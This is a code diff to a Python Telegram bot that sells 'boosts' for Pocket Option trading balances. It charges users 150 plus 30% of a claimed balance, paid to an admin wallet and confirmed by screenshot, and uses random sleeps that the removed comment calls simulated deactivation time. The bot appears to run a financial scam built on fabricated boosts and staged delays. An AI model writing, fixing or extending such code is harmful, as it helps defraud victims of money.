@@ -669,7 +669,7 @@ async def start_paid_boost_handler(callback: types.CallbackQuery, state: FSMCont
     """Handles the 'Start Boost' button after the first free boost."""
     from app.dispatcher import admin_panel  # For referral link
     user_id = callback.from_user.id
-    boost_info = get_user_boost_info(user_id)
+    boost_info = get_user_boost_info(user_id) or {}
 
     final_balance = boost_info.get('final_balance', boost_info.get('current_balance', 0))
     amount_to_pay = 150 + (final_balance * 0.30)
@@ -681,7 +681,7 @@ async def start_paid_boost_handler(callback: types.CallbackQuery, state: FSMCont
             amount_to_pay=f"{amount_to_pay:.2f}",
             wallet_address=admin_panel.get_wallet_address()
         ),
-        reply_markup=get_paid_boost_keyboard(),
+        reply_markup=get_paid_boost_keyboard(MANAGER_URL),
         parse_mode="HTML"
     )
     await state.set_state(UserFlow.waiting_for_payment_screenshot)
@@ -726,18 +726,12 @@ async def payment_screenshot_handler(message: types.Message, state: FSMContext):
     await start_handler(message, state) # Go back to start
 
 # --- HANDLERS FOR BOOSTING MODE ---
-@user_router.callback_query(F.data == "stop_boost", UserFlow.pocket_option_boosting)
+@user_router.callback_query(F.data == "stop_boost")
 async def stop_boost_handler(callback: types.CallbackQuery, state: FSMContext):
     """Handles the 'Stop Boost' button."""
     user_id = callback.from_user.id
     boost_info = get_user_boost_info(user_id)
     
-    # await callback.message.answer(
-    #     text=messages["pocket_option_stopping"],
-    #     parse_mode="HTML"
-    # )
-    
-    # Simulate deactivation time
     await asyncio.sleep(random.randint(3, 5))
     
     if boost_info:
@@ -746,25 +740,21 @@ async def stop_boost_handler(callback: types.CallbackQuery, state: FSMContext):
             final_balance=f"${boost_info['current_balance']:.2f}"
         )
         await send_message_with_photo(
-            message=callback.message, # Use the message object we have
-            photo_name="Deposit bost complited.jpg",
+            message=callback,
+            photo_name="Deposit bost complited.jpg", # maps -> 12.jpg
             text=final_message,
             reply_markup=get_boost_finished_keyboard()
         )
     else:
         await send_message_with_photo(
-            message=callback.message,
-            photo_name="succes connected.jpg", # Generic success
+            message=callback,
+            photo_name="succes connected.jpg",
             text=messages["pocket_option_stopped"],
-            reply_markup=None
+            reply_markup=get_boost_finished_keyboard()
         )
-        
     stop_boost(user_id)
     await state.clear()
-    
-    # Send user back to the start menu after a short delay
-    await asyncio.sleep(2)
-    await start_handler(callback.message, state)
+    await callback.answer()
 
 @user_router.callback_query(F.data == "current_balance")
 async def current_balance_handler(callback: types.CallbackQuery, state: FSMContext):
